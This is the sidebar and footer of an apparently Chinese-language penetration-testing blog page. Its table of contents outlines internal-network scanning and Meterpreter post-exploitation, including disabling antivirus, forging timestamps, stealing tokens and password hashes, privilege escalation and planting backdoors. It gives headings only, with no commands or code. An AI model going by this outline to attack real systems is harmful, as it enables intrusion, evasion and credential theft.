href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3%E7%9A%84banner%E4%BF%A1%E6%81%AF"><span class="toc-number">3.7.</span> <span class="toc-text">收集域内端口的banner信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB"><span class="toc-number">4.</span> <span class="toc-text">探测内网主机存活</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8NetBIOS%E5%BF%AB%E9%80%9F%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB"><span class="toc-number">4.1.</span> <span class="toc-text">利用NetBIOS快速扫描内网存活</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Ping%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%EF%BC%88ICMP%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">利用Ping探测内网主机存活（ICMP）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8arp-scan-exe%E5%B7%A5%E5%85%B7%E3%80%82"><span class="toc-number">5.1.</span> <span class="toc-text">利用arp-scan.exe工具。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">5.2.</span> <span class="toc-text">Nmap扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC%E5%B9%B6%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">下载脚本并在内存中执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95"><span class="toc-number">7.</span> <span class="toc-text">下载文件到指定目录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%B0%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">8.</span> <span class="toc-text">下载文件到当前目录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E4%B8%8Epowersploit%E8%81%94%E5%90%88"><span class="toc-number">8.1.</span> <span class="toc-text">msf与powersploit联合</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meterpreter%E5%90%8E%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">9.</span> <span class="toc-text">meterpreter后渗透命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">9.1.</span> <span class="toc-text">手动进程迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%81%E7%A7%BB"><span class="toc-number">9.2.</span> <span class="toc-text">自动化迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">9.3.</span> <span class="toc-text">查看目标机的系统信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A"><span class="toc-number">9.4.</span> <span class="toc-text">查看是否运行在虚拟机上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4"><span class="toc-number">9.5.</span> <span class="toc-text">查看运行时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">9.6.</span> <span class="toc-text">查看当前权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">9.7.</span> <span class="toc-text">关闭杀毒软件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AERDP%EF%BC%883389%EF%BC%89"><span class="toc-number">9.7.1.</span> <span class="toc-text">启动目标机的远程桌面协议RDP（3389）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%A4%9A%E5%B0%91%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="toc-number">9.8.</span> <span class="toc-text">查看多少用户登录目标机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E4%B8%BE%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E5%9C%A8%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%8F%AA%E5%AD%98%E5%9C%A8AWVS"><span class="toc-number">9.9.</span> <span class="toc-text">列举用户安装在系统上的应用程序(目标机只存在AWVS)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">小总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">10.0.1.</span> <span class="toc-text">基本系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">10.0.2.</span> <span class="toc-text">常用cmd命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execute%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">10.0.3.</span> <span class="toc-text">execute执行文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">10.0.4.</span> <span class="toc-text">基本文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#timestomp%E4%BC%AA%E9%80%A0%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">10.0.5.</span> <span class="toc-text">timestomp伪造时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">10.0.6.</span> <span class="toc-text">基本网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#portfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.0.7.</span> <span class="toc-text">portfwd端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#autoroute%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">10.0.8.</span> <span class="toc-text">autoroute添加路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86"><span class="toc-number">10.0.9.</span> <span class="toc-text">Socks代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">10.0.10.</span> <span class="toc-text">常用脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sniffer%E6%8A%93%E5%8C%85"><span class="toc-number">10.0.11.</span> <span class="toc-text">sniffer抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-number">10.0.12.</span> <span class="toc-text">窃取令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4"><span class="toc-number">10.0.13.</span> <span class="toc-text">网络摄像头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%AA%E5%B1%8F"><span class="toc-number">10.0.14.</span> <span class="toc-text">截屏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.</span> <span class="toc-text">0x05 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getsystem%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.1.</span> <span class="toc-text">getsystem提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.2.</span> <span class="toc-text">本地漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%AA%83%E5%8F%96hash%E5%8F%8A%E5%AF%86%E7%A0%81-amp-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">10.2.</span> <span class="toc-text">0x06 窃取hash及密码&amp;哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96hash%E5%8F%8A%E5%AF%86%E7%A0%81"><span class="toc-number">10.2.1.</span> <span class="toc-text">窃取hash及密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hashdump"><span class="toc-number">10.2.1.1.</span> <span class="toc-text">hashdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kiwi"><span class="toc-number">10.2.1.2.</span> <span class="toc-text">kiwi</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-RDP"><span class="toc-number">10.3.</span> <span class="toc-text">0x07 RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C"><span class="toc-number">10.4.</span> <span class="toc-text">0x08 注册表操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5"><span class="toc-number">10.5.</span> <span class="toc-text">0x09 后门植入</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="无题">无题</a><time datetime="2022-05-24T05:43:29.488Z" title="发表于 2022-05-24 13:43:29">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/empire%E4%BD%BF%E7%94%A8/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/empire%E4%BD%BF%E7%94%A8/" title="无题">无题</a><time datetime="2022-05-24T05:43:19.587Z" title="发表于 2022-05-24 13:43:19">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/" title="无题">无题</a><time datetime="2022-05-24T05:43:06.204Z" title="发表于 2022-05-24 13:43:06">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%86%85%E7%BD%91%E5%A5%BD%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%86%85%E7%BD%91%E5%A5%BD%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="无题">无题</a><time datetime="2022-05-24T05:42:40.146Z" title="发表于 2022-05-24 13:42:40">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/" title="无题">无题</a><time datetime="2022-01-17T05:27:19.293Z" title="发表于 2022-01-17 13:27:19">2022-01-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 北孤清茶lth</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">你好，欢迎来到我的 <a target="_blank" rel="noopener" href="http://c-hasel.cn/">博客</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
